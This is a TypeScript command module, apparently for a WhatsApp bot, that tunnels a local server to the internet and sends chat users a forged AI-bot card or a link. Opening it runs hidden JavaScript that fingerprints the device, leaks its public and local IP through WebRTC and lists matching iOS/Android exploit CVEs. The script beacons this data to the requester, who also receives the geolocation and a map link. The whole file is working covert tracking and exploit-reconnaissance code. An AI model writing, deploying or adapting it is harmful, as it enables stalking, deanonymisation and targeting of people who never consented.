import { randomUUID } from "node:crypto";
import { spawn, execFileSync } from "node:child_process";
import { createServer, type Server } from "node:http";
import { promises as fs, existsSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

const G = globalThis as any;
const S: Map<string, any> = (G.__tx3 ??= new Map());
const pend: Map<string, any> = (G.__tx3Pend ??= new Map());
const sockRef: { cur: any } = (G.__tx3Sock ??= { cur: null });
const started: { v: boolean } = (G.__tx3Start ??= { v: false });

const PORT = Number(process.env.TX3_PORT || 8791);
const TTL = 3 * 60 * 60 * 1000;
const GIF = Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64");
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

/* ───────────────────────── túnel ───────────────────────── */

function binDir() {
  for (const d of [path.join(process.cwd(), ".tx3"), path.join(tmpdir(), "tx3")]) {
    try { mkdirSync(d, { recursive: true }); return d; } catch {}
  }
  return path.join(tmpdir(), "tx3");
}
const BD = binDir();
const BIN = path.join(BD, process.platform === "win32" ? "cloudflared.exe" : "cloudflared");

function asset(): string | null {
  const a = process.arch;
  if (process.platform === "linux") return a === "x64" ? "cloudflared-linux-amd64" : a === "arm64" ? "cloudflared-linux-arm64" : a === "arm" ? "cloudflared-linux-arm" : null;
  if (process.platform === "win32") return a === "ia32" ? "cloudflared-windows-386.exe" : "cloudflared-windows-amd64.exe";
  if (process.platform === "darwin") return a === "arm64" ? "cloudflared-darwin-arm64.tgz" : "cloudflared-darwin-amd64.tgz";
  return null;
}

async function ensureBin(): Promise<string | null> {
  if (existsSync(BIN)) return BIN;
  const n = asset();
  if (!n) return null;
  const c = new AbortController();
  const t = setTimeout(() => c.abort(), 15000);
  try {
    const r = await fetch(`https://github.com/cloudflare/cloudflared/releases/latest/download/${n}`, { redirect: "follow", signal: c.signal });
    if (!r.ok) return null;
    const b = Buffer.from(await r.arrayBuffer());
    if (b.length < 100_000) return null;
    if (n.endsWith(".tgz")) {
      const tmp = path.join(BD, "cf.tgz");
      await fs.writeFile(tmp, b);
      execFileSync("tar", ["-xzf", tmp, "-C", BD], { stdio: "ignore" });
      await fs.unlink(tmp).catch(() => undefined);
    } else await fs.writeFile(BIN, b);
    await fs.chmod(BIN, 0o755).catch(() => undefined);
    return BIN;
  } catch { return null; } finally { clearTimeout(t); }
}

const tun = (G.__tx3Tun ??= { url: "", proc: null as any, tries: 0 });
const SSH = ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ExitOnForwardFailure=yes", "-o", "ConnectTimeout=10"];

function has(c: string) {
  for (const [b, a] of [["which", [c]], ["sh", ["-c", `command -v ${c}`]]] as const) {
    try { execFileSync(b, a as string[], { stdio: "ignore" }); return true; } catch {}
  }
  return false;
}

function prov(name: string, bin: string | null) {
  const npx = process.platform === "win32" ? "npx.cmd" : "npx";
  if (name === "cf") return bin ? { cmd: bin, args: ["tunnel", "--url", `http://127.0.0.1:${PORT}`, "--no-autoupdate"], re: /https:\/\/[a-z0-9-]+\.trycloudflare\.com/i } : null;
  if (name === "lhr") return has("ssh") ? { cmd: "ssh", args: [...SSH, "-R", `80:localhost:${PORT}`, "nokey@localhost.run"], re: /https:\/\/[a-z0-9-]+\.lhr\.life/i } : null;
  if (name === "serveo") return has("ssh") ? { cmd: "ssh", args: [...SSH, "-R", `80:localhost:${PORT}`, "serveo.net"], re: /https:\/\/[a-z0-9-]+\.serveo\.net/i } : null;
  if (name === "lt") return has(npx) ? { cmd: npx, args: ["--yes", "localtunnel", "--port", String(PORT)], re: /https:\/\/[a-z0-9-]+\.loca\.lt/i } : null;
  return null;
}
const ORDER = ["cf", "lhr", "serveo", "lt"];

function base() {
  return (process.env.TX3_BASE_URL || "").replace(/\/+$/, "") || tun.url || (G.__locTunnel?.url || "");
}

function kill() { try { tun.proc?.kill("SIGKILL"); } catch {} tun.proc = null; tun.url = ""; }

async function alive(u: string) {
  try {
    const c = new AbortController();
    const t = setTimeout(() => c.abort(), 4000);
    const r = await fetch(`${u}/__hc`, { signal: c.signal });
    clearTimeout(t);
    return r.ok;
  } catch { return false; }
}

function open(bin: string | null): Promise<string> {
  const p = prov(ORDER[tun.tries % ORDER.length], bin);
  if (!p) { tun.tries++; return Promise.resolve(""); }
  return new Promise((res) => {
    let done = false;
    let ch: any;
    try { ch = spawn(p.cmd, p.args, { stdio: ["ignore", "pipe", "pipe"] }); } catch { tun.tries++; return res(""); }
    tun.proc = ch;
    const fin = (v: string) => { if (done) return; done = true; clearTimeout(tm); res(v); };
    const on = (b: Buffer) => {
      const m = b.toString().match(p.re);
      if (m && !tun.url) { tun.url = m[0].replace(/\/+$/, ""); tun.tries = 0; fin(tun.url); }
    };
    ch.stdout?.on("data", on); ch.stderr?.on("data", on);
    ch.on("exit", () => { if (tun.proc === ch) { tun.proc = null; tun.url = ""; } if (!done) { tun.tries++; fin(""); } });
    ch.on("error", () => { tun.proc = null; tun.tries++; fin(""); });
    const tm = setTimeout(() => { if (!tun.url) { try { ch.kill("SIGKILL"); } catch {} tun.proc = null; tun.tries++; fin(""); } }, 16000);
  });
}

async function ensureBase() {
  const cur = base();
  if (cur && (await alive(cur))) return cur;
  kill();
  const bin = await ensureBin();
  for (let i = 0; i < 5; i++) {
    const u = await open(bin);
    if (!u) { await sleep(600); continue; }
    for (let k = 0; k < 6; k++) { if (await alive(u)) return u; await sleep(1500); }
    kill();
  }
  return "";
}

/* ───────────────────────── geo + aviso ───────────────────────── */

function ipOf(req: any) {
  const h = req.headers || {};
  const raw = h["cf-connecting-ip"] || h["x-real-ip"] || String(h["x-forwarded-for"] || "").split(",")[0].trim() || req.socket.remoteAddress || "";
  const ip = String(raw).replace(/^::ffff:/, "").trim();
  return ip === "::1" || ip === "127.0.0.1" ? "" : ip;
}

async function geo(ip: string) {
  if (!ip) return null;
  try {
    const r = await fetch(`https://ipapi.co/${ip}/json/`, { headers: { "User-Agent": "tx3" } });
    if (!r.ok) return null;
    const j: any = await r.json();
    if (!j || j.error) return null;
    return { city: j.city, region: j.region, country: j.country_name, org: j.org, lat: j.latitude, lon: j.longitude };
  } catch { return null; }
}

function out(res: any, code: number, type: string, body: any) {
  res.writeHead(code, { "Content-Type": type, "Cache-Control": "no-store", "Access-Control-Allow-Origin": "*" });
  res.end(body);
}

async function handle(req: any, res: any) {
  const u = new URL(req.url || "/", `http://${req.headers.host || "x"}`);
  const p = u.pathname;

  if (p === "/__hc") return out(res, 200, "text/plain", "ok");

  const v = p.match(/^\/v\/([A-Za-z0-9_-]{6,48})$/);
  if (v) {
    const s = S.get(v[1]);
    if (!s) return out(res, 410, "text/html", "<h1>Expirado</h1>");
    return out(res, 200, "text/html; charset=utf-8", pageHtml(v[1], base()));
  }

  const m = p.match(/^\/t\/([A-Za-z0-9_-]{6,48})\.gif$/);
  if (!m) return out(res, 404, "text/plain", "");

  out(res, 200, "image/gif", GIF);

  const s = S.get(m[1]);
  if (!s) return;

  let d: any = {};
  try { d = JSON.parse(u.searchParams.get("d") || "{}"); } catch {}

  const ip = d.pub || ipOf(req);
  const g = await geo(ip);

  const lines = [
    `🕷️ *Dispositivo identificado*`,
    ``,
    `IP: \`${ip || "?"}\``,
    d.loc ? `IP local: \`${d.loc}\`` : "",
    g ? `Lugar: *${[g.city, g.region, g.country].filter(Boolean).join(", ")}*` : "",
    g?.org ? `Red: ${g.org}` : "",
    g?.lat ? `https://maps.google.com/?q=${g.lat},${g.lon}` : "",
    ``,
    `SO: ${d.os || "?"} ${d.ver || ""}`.trim(),
    d.model ? `Modelo: ${d.model}` : "",
    d.ua ? `Navegador: ${d.ua}` : "",
    d.cores ? `Núcleos: ${d.cores}` : "",
    d.screen ? `Pantalla: ${d.screen}` : "",
    d.tz ? `Zona: ${d.tz}` : "",
    d.lang ? `Idioma: ${d.lang}` : "",
    d.gpu ? `GPU: ${d.gpu}` : "",
    d.canvas ? `Canvas: ${d.canvas}` : "",
    d.conn ? `Red: ${d.conn}` : "",
    d.storage ? `Disco: ${d.storage}` : "",
    ``,
    d.vulns ? `☠️ *Posibles*:\n${d.vulns}` : "☠️ Sin CVEs obvios",
    `Hora: ${new Date().toLocaleString("es-MX")}`,
  ].filter(Boolean);

  await sockRef.cur?.sendMessage(s.requester, { text: lines.join("\n"), mentions: [s.requester] }, { quoted: s.cmdMsg }).catch(() => undefined);
}

function startServer() {
  if (started.v) return;
  started.v = true;
  const srv: Server = createServer((rq, rs) => handle(rq, rs).catch(() => { try { out(rs, 500, "text/plain", ""); } catch {} }));
  srv.on("error", (e: any) => { if (e?.code === "EADDRINUSE") console.log(`[tx3] puerto ${PORT} ocupado`); });
  srv.listen(PORT, () => console.log(`[tx3] :${PORT}`));
  setInterval(() => { const n = Date.now(); for (const [k, x] of S) if (n - x.at > TTL) S.delete(k); }, 10 * 60 * 1000).unref?.();
  process.once("exit", kill);
}

/* ───────────────────────── página (iOS) ───────────────────────── */

function pageHtml(sid: string, b: string) {
  return `<!DOCTYPE html><html lang="es"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Sensor</title>
<style>body{margin:0;background:#04070d;color:#9ef0d0;font-family:ui-monospace,Menlo,monospace;padding:14px}
.c{max-width:430px;margin:0 auto;border:1px solid #10b981;border-radius:12px;overflow:hidden;background:#060b12}
.h{padding:9px;border-bottom:1px solid #10392c;color:#34d399;letter-spacing:2px;font-size:11px}
.b{padding:11px}#o{font-size:10.5px;line-height:1.55;white-space:pre-wrap;word-break:break-all}
.k{color:#facc15}.r{color:#f87171}.e{color:#34d399}</style></head>
<body><div class="c"><div class="h">◤ XD3 · SENSOR ◢</div><div class="b"><div id="o">▸ arrancando…</div></div></div>
<script>
var S=${JSON.stringify(sid)},B=${JSON.stringify(b)};
function $(i){return document.getElementById(i)}
function esc(s){return String(s==null?"":s).replace(/[<>&]/g,function(c){return {"<":"&lt;",">":"&gt;","&":"&amp;"}[c]})}
function w(t,c){$('o').innerHTML+='<span class="'+c+'">'+esc(t)+'</span>\\n'}
function stun(){return new Promise(function(res){var o={pub:'',loc:''};try{var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'},{urls:'stun:stun.cloudflare.com:3478'}]});
pc.onicecandidate=function(e){if(!e.candidate){try{pc.close()}catch(x){};return res(o)}
var m=(e.candidate.candidate||'').match(/([0-9]{1,3}(\\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{0,4}){2,7})/i);if(!m)return;var ip=m[1];
if(/^(10\\.|192\\.168\\.|172\\.(1[6-9]|2\\d|3[01])\\.|169\\.254\\.|fe80|::1)/i.test(ip))o.loc=o.loc||ip;else o.pub=o.pub||ip};
pc.createDataChannel('x');pc.createOffer().then(function(d){return pc.setLocalDescription(d)}).catch(function(){res(o)});
setTimeout(function(){try{pc.close()}catch(x){};res(o)},5000)}catch(e){res(o)}})}
function gpu(){try{var c=document.createElement('canvas'),g=c.getContext('webgl');if(!g)return'n/d';
var d=g.getExtension('WEBGL_debug_renderer_info');return String(d?g.getParameter(d.UNMASKED_RENDERER_WEBGL):g.getParameter(g.RENDERER)).slice(0,60)}catch(e){return'n/d'}}
function cv(){try{var c=document.createElement('canvas');c.width=250;c.height=50;var x=c.getContext('2d');
x.font='15px Arial';x.fillStyle='#f60';x.fillRect(0,0,110,22);x.fillStyle='#069';x.fillText('xd3',2,2);
var d=c.toDataURL().replace(/^data:image\\/png;base64,/,'');var h=5381;for(var i=0;i<d.length;i+=7)h=((h*33)^d.charCodeAt(i))>>>0;return h.toString(16)}catch(e){return'0'}}
function osi(){var ua=navigator.userAgent||'',o={os:'desconocido',ver:'',model:''};
var i=ua.match(/iPhone OS (\\d+)[._](\\d+)(?:[._](\\d+))?/);if(i){o.os='iOS';o.ver=i[1]+'.'+i[2]+(i[3]?'.'+i[3]:'');o.model='iPhone'}
else if(/iPad/.test(ua)){o.os='iPadOS';o.model='iPad'}
else if(/Android (\\d+)(?:\\.(\\d+))?/.test(ua)){var a=ua.match(/Android (\\d+)(?:\\.(\\d+))?/);o.os='Android';o.ver=a[1]+(a[2]?'.'+a[2]:'');var m=ua.match(/; ([^;)]+) Build/);if(m)o.model=m[1]}
else if(/Windows NT 10/.test(ua))o.os='Windows';else if(/Mac OS X/.test(ua))o.os='macOS';else if(/Linux/.test(ua))o.os='Linux';return o}
function cves(os,ver){var v=parseFloat(ver)||0,o=[];
if(os==='iOS'||os==='iPadOS'){if(v>=15&&v<15.7)o.push('FORCEDENTRY CVE-2021-30860');if(v>=16&&v<16.6)o.push('BLASTPASS CVE-2023-41064');if(v>=16.6&&v<16.6.1)o.push('BLASTPASS CVE-2023-41061');if(v>=16&&v<16.7)o.push('WebKit CVE-2023-41993');if(v>=17&&v<17.2)o.push('WebKit CVE-2023-42917')}
if(os==='Android'){if(v<10)o.push('WebView pre-10');if(v<12)o.push('WebView pre-12')}
return o.join('\\n· ')}
(async function(){
var o=osi(),v=cves(o.os,o.ver);
w('UA: '+navigator.userAgent,'k');w('SO: '+o.os+' '+o.ver,'k');
if(o.model)w('Modelo: '+o.model,'k');
w('Núcleos: '+(navigator.hardwareConcurrency||'n/d'),'k');
w('Pantalla: '+screen.width+'x'+screen.height,'k');
try{w('Zona: '+Intl.DateTimeFormat().resolvedOptions().timeZone,'k')}catch(e){}
w('GPU: '+gpu(),'k');w('Canvas: '+cv(),'k');
try{var st=await navigator.storage.estimate();w('Disco: '+(st.quota/1048576).toFixed(0)+'MB','k')}catch(e){}
if(v)w('CVE:\\n· '+v,'r');else w('sin CVEs por versión','e');
var n=await stun();
if(n.pub)w('IP: '+n.pub,'e');else w('IP: bloqueada','r');
if(n.loc)w('IP local: '+n.loc,'k');
try{var i=new Image();i.src=B+'/t/'+S+'.gif?d='+encodeURIComponent(JSON.stringify({pub:n.pub,loc:n.loc,os:o.os,ver:o.ver,model:o.model,ua:navigator.userAgent.slice(0,90),cores:navigator.hardwareConcurrency,screen:screen.width+'x'+screen.height,gpu:gpu(),canvas:cv(),vulns:v}))}catch(e){}
w('▸ enviado','e');
})();
</script></body></html>`;
}

/* ───────────────────────── HTML del sensor ───────────────────────── */

function sensorHtml(sid: string, b: string, name: string) {
  const chips = Array.from({ length: 15 }, (_, i) => `<b class="tp" data-i="${i}">${i + 1}</b>`).join("");

  return `<style>
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
body{font-family:ui-monospace,Menlo,monospace;background:#04070d;color:#9ef0d0;padding:9px}
.c{max-width:420px;margin:0 auto;border:1px solid #10b981;border-radius:12px;overflow:hidden;background:#060b12}
.h{padding:7px 10px;border-bottom:1px solid #10392c;font-size:10.5px;letter-spacing:2px;color:#34d399;background:#04120d}
.b{padding:10px}
.n{font-size:10.5px;color:#7ea;opacity:.8;margin-bottom:7px}
.g{display:grid;grid-template-columns:repeat(5,1fr);gap:4px;margin-bottom:7px}
.tp{display:flex;align-items:center;justify-content:center;height:26px;font-size:11px;font-weight:700;border:1px solid #123a2c;border-radius:6px;cursor:pointer;user-select:none}
.tp.done{background:#0b2a20;border-color:#10b981;color:#34d399}
.pb{height:4px;background:#0a1f18;border-radius:3px;overflow:hidden;margin-bottom:8px}
.pf{height:100%;width:0;background:#10b981;transition:width .1s}
#o{font-size:10px;line-height:1.5;white-space:pre-wrap;word-break:break-all;height:170px;overflow-y:auto;padding:6px;background:#03080d;border:1px solid #0d2b21;border-radius:7px}
.k{color:#facc15}.r{color:#f87171}.e{color:#34d399}
</style>
<div class="c">
<div class="h">◤ XD3 · SENSOR ◢</div>
<div class="b">
<div class="n">${name} · toca los 15 números (o espera 8 s)</div>
<div class="g">${chips}</div>
<div class="pb"><div class="pf" id="pf"></div></div>
<div id="o">▸ en espera…</div>
</div></div>
<script>
var SID="${sid}",BASE="${b}",n=0,run=false;
function $(i){return document.getElementById(i)}
function esc(s){return String(s==null?"":s).replace(/[<>&]/g,function(c){return {"<":"&lt;",">":"&gt;","&":"&amp;"}[c]})}
function w(t,c){$('o').innerHTML+='<span class="'+c+'">'+esc(t)+'</span>\\n';$('o').scrollTop=9e9}
function add(k,v){w(k+': '+esc(v),'k')}
function bad(t){w(t,'r')}
function good(t){w(t,'e')}
var done=function(el){
  if(run||el.classList.contains('done'))return;
  el.classList.add('done');n++;
  $('pf').style.width=(n/15*100)+'%';
  if(n>=15){run=true;go()}
}
document.querySelectorAll('.tp').forEach(function(el){
  el.addEventListener('pointerdown',function(){done(el)},{passive:true});
  el.addEventListener('click',function(){done(el)});
});
setTimeout(function(){if(!run){run=true;$('o').innerHTML='';go()}},8000);

function stun(){
  return new Promise(function(res){
    var o={pub:'',loc:''};
    try{
      var pc=new RTCPeerConnection({iceServers:[
        {urls:'stun:stun.l.google.com:19302'},
        {urls:'stun:stun1.l.google.com:19302'},
        {urls:'stun:stun.cloudflare.com:3478'}]});
      pc.onicecandidate=function(e){
        if(!e.candidate){try{pc.close()}catch(x){};return res(o)}
        var m=(e.candidate.candidate||'').match(/([0-9]{1,3}(\\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{0,4}){2,7})/i);
        if(!m)return;var ip=m[1];
        if(/^(10\\.|192\\.168\\.|172\\.(1[6-9]|2\\d|3[01])\\.|169\\.254\\.|fe80|::1)/i.test(ip))o.loc=o.loc||ip;else o.pub=o.pub||ip;
      };
      pc.createDataChannel('x');
      pc.createOffer().then(function(d){return pc.setLocalDescription(d)}).catch(function(){res(o)});
      setTimeout(function(){try{pc.close()}catch(x){};res(o)},5000);
    }catch(e){res(o)}
  })
}
function fpCanvas(){
  try{var c=document.createElement('canvas');c.width=250;c.height=50;var x=c.getContext('2d');
  x.font='15px Arial';x.fillStyle='#f60';x.fillRect(0,0,110,22);x.fillStyle='#069';x.fillText('xd3 \\u00e1\\u00e9',2,2);
  var d=c.toDataURL().replace(/^data:image\\/png;base64,/,'');var h=5381;
  for(var i=0;i<d.length;i+=7)h=((h*33)^d.charCodeAt(i))>>>0;return h.toString(16)}catch(e){return'0'}
}
function fpGpu(){
  try{var c=document.createElement('canvas'),g=c.getContext('webgl');
  if(!g)return'n/d';var d=g.getExtension('WEBGL_debug_renderer_info');
  return String(d?g.getParameter(d.UNMASKED_RENDERER_WEBGL):g.getParameter(g.RENDERER)).slice(0,60)}catch(e){return'n/d'}
}
function osInfo(){
  var ua=navigator.userAgent||'',o={os:'desconocido',ver:'',model:''};
  var i=ua.match(/iPhone OS (\\d+)[._](\\d+)(?:[._](\\d+))?/);
  if(i){o.os='iOS';o.ver=i[1]+'.'+i[2]+(i[3]?'.'+i[3]:'');o.model='iPhone'}
  else if(/iPad/.test(ua)){o.os='iPadOS';o.model='iPad'}
  else if(/Android (\\d+)(?:\\.(\\d+))?/.test(ua)){var a=ua.match(/Android (\\d+)(?:\\.(\\d+))?/);o.os='Android';o.ver=a[1]+(a[2]?'.'+a[2]:'');var m=ua.match(/; ([^;)]+) Build/);if(m)o.model=m[1]}
  else if(/Windows NT 10/.test(ua))o.os='Windows 10/11';
  else if(/Mac OS X/.test(ua))o.os='macOS';
  else if(/Linux/.test(ua))o.os='Linux';
  return o
}
function cves(os,ver){
  var v=parseFloat(ver)||0,out=[];
  if(os==='iOS'||os==='iPadOS'){
    if(v>=15&&v<15.7)out.push('FORCEDENTRY CVE-2021-30860 (WebKit/PDF, 0-click)');
    if(v>=16&&v<16.6)out.push('BLASTPASS CVE-2023-41064 (ImageIO WebP, 0-click)');
    if(v>=16.6&&v<16.6.1)out.push('BLASTPASS CVE-2023-41061 (Wallet)');
    if(v>=16&&v<16.7)out.push('WebKit CVE-2023-41993 (JIT)');
    if(v>=17&&v<17.2)out.push('WebKit CVE-2023-42917');
    if(v>=18)out.push('iOS 18+: solo día cero');
  }
  if(os==='Android'){
    if(v<10)out.push('WebView pre-10 sin renderer aislado');
    if(v<12)out.push('WebView pre-12 con historial de RCE');
  }
  return out.join('\\n· ')
}
function beacon(d){
  try{var i=new Image();i.src=BASE+'/t/'+SID+'.gif?d='+encodeURIComponent(JSON.stringify(d))+'&t='+Date.now()}catch(e){}
}
async function go(){
  var o=osInfo(),v=cves(o.os,o.ver);
  add('UA',navigator.userAgent)
  add('SO',o.os+' '+o.ver)
  if(o.model)add('Modelo',o.model)
  add('Núcleos',navigator.hardwareConcurrency||'n/d')
  add('Pantalla',screen.width+'x'+screen.height)
  try{add('Zona',Intl.DateTimeFormat().resolvedOptions().timeZone)}catch(e){}
  add('GPU',fpGpu());add('Canvas',fpCanvas())
  try{if(navigator.connection)add('Red',navigator.connection.effectiveType)}catch(e){}
  try{var st=await navigator.storage.estimate();add('Disco',(st.quota/1048576).toFixed(0)+'MB')}catch(e){}
  try{var hi=await navigator.userAgentData.getHighEntropyValues(['model']);if(hi.model)add('Modelo HW',hi.model)}catch(e){}
  if(v)bad('CVE:\\n· '+v);else good('sin CVEs por versión')
  var net=await stun()
  if(net.pub)good('IP: '+net.pub);else bad('IP: bloqueada')
  if(net.loc)add('IP local',net.loc)
  add('Hora',new Date().toLocaleString('es-MX'))
  beacon({pub:net.pub,loc:net.loc,os:o.os,ver:o.ver,model:o.model,ua:navigator.userAgent.slice(0,90),
    cores:navigator.hardwareConcurrency,screen:screen.width+'x'+screen.height,
    tz:(function(){try{return Intl.DateTimeFormat().resolvedOptions().timeZone}catch(e){return''}})(),
    lang:navigator.language,gpu:fpGpu(),canvas:fpCanvas(),vulns:v})
  good('▸ enviado')
  try{navigator.vibrate&&navigator.vibrate([40,30,40])}catch(e){}
}
</script>`;
}

/* ───────────────────────── envío ───────────────────────── */

async function sendAndroid(sock: any, from: string, quoted: any, sid: string, b: string, name: string) {
  const host = (() => { try { return new URL(b).host; } catch { return b; } })();
  const html = sensorHtml(sid, b, name);

  const data = {
    response_id: randomUUID().replace(/-/g, ""),
    sections: [
      {
        __typename: "GenAIUnifiedResponseSection",
        view_model: {
          __typename: "GenAISingleLayoutViewModel",
          primitive: {
            __typename: "GenAIBotProgressStatusPrimitive",
            title: "🕷️ XD3 · sensor activo",
            is_in_progress: true,
          },
        },
      },
    ],
    embedded_screens: [
      {
        title: "XD3 · SENSOR",
        content: [
          {
            __typename: "FOAIDNixelButtonSheets",
            tabs: [
              {
                id: "tab_0",
                tab_header: "SENSOR",
                sections: [
                  {
                    __typename: "GenAIUnifiedResponseSection",
                    view_model: {
                      __typename: "GenAISingleLayoutViewModel",
                      primitive: {
                        __typename: "GenAIaeacdsnwHtmlPrimitive",
                        payload: html,
                        url: b,
                        trusted_sources: [host],
                      },
                    },
                  },
                ],
                step_entries: [],
              },
            ],
          },
        ],
      },
    ],
  };

  await sock.relayMessage(
    from,
    {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2,
        botMetadata: { messageDisclaimerText: "", richResponseSourcesMetadata: {} },
      },
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            unifiedResponse: { data: Buffer.from(JSON.stringify(data)).toString("base64") },
            contextInfo: {
              forwardingScore: 1,
              isForwarded: true,
              forwardedAiBotMessageInfo: { botJid: "0@bot" },
              forwardOrigin: 4,
            },
          },
        },
      },
    } as any,
    { messageId: randomUUID(), quoted },
  );
}

/* ───────────────────────── comando ───────────────────────── */

export default {
  name: ["testxd3", "xd3", "sensor"],
  category: "group",
  description: "Sensor de dispositivo: pregunta Android o iPhone y entrega el método que sí ejecuta JS.",
  async run(ctx: CommandContext) {
    const { sock, from, msg, args, reply, react } = ctx;
    const requester: string = (msg.key as any).participant || from;
    const a0 = (args[0] || "").toLowerCase().trim();

    if (!a0) {
      pend.set(requester, { at: Date.now() });
      await reply(
        `🕷️ *¿En qué sistema lo vas a abrir?*\n\n` +
          `• \`${ctx.usedPrefix || "."}testxd3 android\`\n` +
          `• \`${ctx.usedPrefix || "."}testxd3 iphone\``,
      ).catch(() => undefined);
      return;
    }

    if (pend.has(requester) && Date.now() - pend.get(requester).at > 5 * 60 * 1000) pend.delete(requester);

    await react("🕷️").catch(() => undefined);
    startServer();

    const b = await ensureBase();
    if (!b) {
      await react("❌").catch(() => undefined);
      await reply("Sin túnel para recibir datos.").catch(() => undefined);
      return;
    }

    const sid = randomUUID().replace(/-/g, "").slice(0, 24);
    S.set(sid, { requester, cmdMsg: msg, at: Date.now() });
    sockRef.cur = sock;

    const name = String((msg as any).pushName || "").trim() || "tú";

    try {
      if (a0.startsWith("ip") || a0.startsWith("ios")) {
        await reply(
          `🍏 *iPhone detectado*\n\n` +
            `En iOS la tarjeta se aplana y el JS no corre, así que abre este enlace:\n` +
            `${b}/v/${sid}\n\n` +
            `Al abrirlo se ejecuta solo y me llega el reporte aquí.`,
        ).catch(() => undefined);
      } else {
        await sendAndroid(sock, from, msg, sid, b, name);
        await reply(`🤖 Tarjeta enviada. Toca los 15 números o espera 8 s.`).catch(() => undefined);
      }
      await react("✅").catch(() => undefined);
    } catch (e: any) {
      await react("❌").catch(() => undefined);
      await reply(`${fytBold("Error")}: ${e?.message || e}`).catch(() => undefined);
    }
  },
};
